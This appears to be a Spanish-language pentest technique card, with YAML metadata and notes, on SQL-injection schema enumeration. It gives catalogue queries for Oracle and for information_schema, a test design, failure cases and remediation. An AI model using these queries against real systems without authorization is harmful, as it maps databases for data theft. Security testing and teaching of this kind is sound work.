---
clase: inyeccion
tech: sql-multi-dbms
cwe: CWE-89
cvss: 7.5 # [derivado] lectura no autorizada de la estructura y el contenido de la BD
payload: |
  # Consultas LITERALES de la fuente para listar tablas y columnas, por DBMS.
  #
  # NOTA DE CONVENCION: 'TABLE-NAME-HERE' es un marcador DE LA FUENTE. No es un
  # placeholder muerto: es una plantilla de tecnica que se instancia con el nombre
  # obtenido en el paso anterior. Debajo de cada bloque doy una instanciacion concreta.
  #
  # Oracle:
  SELECT * FROM all_tables
  SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
  # instanciado:
  SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
  #
  # Microsoft, PostgreSQL y MySQL comparten information_schema:
  SELECT * FROM information_schema.tables
  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
  # instanciado:
  SELECT * FROM information_schema.columns WHERE table_name = 'users'
  #
  # ADVERTENCIA de mayusculas: Oracle almacena los identificadores en MAYUSCULAS por
  # defecto, asi que 'users' no coincide y 'USERS' si. En MySQL/PostgreSQL el nombre
  # suele ir en minusculas. Es una causa muy comun de 'no devuelve nada' que se
  # confunde con ausencia de la tabla.
precondicion: "Inyeccion SQL confirmada, motor ya identificado (ver sqli-fingerprint-version-por-dbms) y un canal de salida que devuelva varias filas o permita iterar. El usuario de la BD debe tener permiso de lectura sobre el catalogo; es lo habitual, porque information_schema suele ser legible por cualquier usuario."
como_se_descubre: |
  Es el segundo paso tras el fingerprint. El orden natural es: listar tablas, elegir
  las de interes por su nombre, y listar sus columnas.
  Señal practica: en Oracle se usa 'all_tables' / 'all_tab_columns' en lugar de
  information_schema. Si information_schema produce error de objeto inexistente y el
  fingerprint apuntaba a Oracle, es confirmacion cruzada del motor.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: SELECT * FROM information_schema.columns WHERE table_name = 'users'  -> filas
  # B: la misma consulta con un nombre de tabla inexistente ('zzzz_no_existe')
  #    -> CERO filas, sin error
  # El par B es necesario para distinguir 'la tabla no existe' de 'la consulta no
  # llega a ejecutarse'. Si B devuelve error en lugar de cero filas, el problema es
  # la inyeccion, no el nombre.
  # C: probar el nombre en MAYUSCULAS y en minusculas (ver advertencia de Oracle).
mata: |
  - El usuario de la BD no puede leer el catalogo -> muere (poco frecuente).
  - El canal de salida solo devuelve una fila y no se puede iterar -> hay que pasar a
    tecnicas de un solo valor (errores condicionales, retardos).
  - Motor mal identificado: information_schema no existe en Oracle.
  - El nombre de tabla se busca con la caja equivocada (ver control C).
fuente: "https://portswigger.net/web-security/sql-injection/cheat-sheet. Consultas literales de la pagina, incluido el marcador 'TABLE-NAME-HERE'. Las instanciaciones concretas y la advertencia sobre mayusculas en Oracle son añadidos mios."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Enumeración de esquema — `information_schema` y el caso aparte de Oracle

## Principio
Una inyección sin conocimiento del esquema obliga a adivinar nombres de tabla y
columna. El catálogo de la base de datos elimina esa adivinanza, y normalmente es
legible por cualquier usuario: `information_schema` está pensado para ser consultable,
así que el permiso rara vez es el obstáculo.

## Payload
**Oracle**, que no usa `information_schema`:

```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

**Microsoft, PostgreSQL y MySQL**, que lo comparten:

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Sobre el marcador `TABLE-NAME-HERE`
Es un marcador **de la fuente**, no un placeholder muerto: la consulta es una plantilla
de técnica que se instancia con el nombre obtenido en el paso anterior. Instanciado:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'users'
```

## La causa más común de "no devuelve nada"
Oracle almacena los identificadores en **mayúsculas** por defecto. Así que
`table_name = 'users'` devuelve cero filas y `table_name = 'USERS'` devuelve el
esquema. En MySQL y PostgreSQL ocurre lo contrario con frecuencia. Es un fallo que se
lee como "la tabla no existe" y detiene el trabajo en falso; probar las dos cajas cuesta
una petición.

## Impacto
Mapa completo de la base de datos: qué tablas hay y qué columnas tienen. Convierte la
extracción posterior de un ejercicio de adivinanza en uno de lectura dirigida, y suele
ser el paso que transforma una inyección "interesante" en un informe con datos
concretos.

## Confirmación cruzada del motor
Si `information_schema` da error de objeto inexistente y el fingerprint apuntaba a
Oracle, las dos observaciones se confirman mutuamente. Conviene aprovecharlo: cada
técnica que falla por sintaxis es también información sobre el motor.

## Remediación
Consultas parametrizadas, que cortan la clase de raíz. `# [derivado]`: como defensa en
profundidad, el usuario de base de datos de la aplicación debe tener el mínimo
privilegio necesario y, donde el motor lo permita, restringir la lectura del catálogo
— aunque esto solo encarece el trabajo del atacante, no lo impide, porque los nombres
también se pueden inferir por fuerza bruta con los oráculos booleanos.
